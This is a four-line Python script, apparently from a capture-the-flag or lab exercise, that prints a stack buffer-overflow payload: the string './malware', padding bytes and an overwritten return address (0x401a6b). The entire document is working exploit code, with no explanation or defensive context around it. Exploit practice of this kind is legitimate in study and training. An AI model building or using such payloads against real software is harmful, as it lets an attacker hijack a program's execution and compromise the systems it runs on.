import sys

payload = b"./malware\x00" + b"A" * 6 + b"B" * 8 + (0x401a6b).to_bytes(8, "little")
sys.stdout.buffer.write(payload)
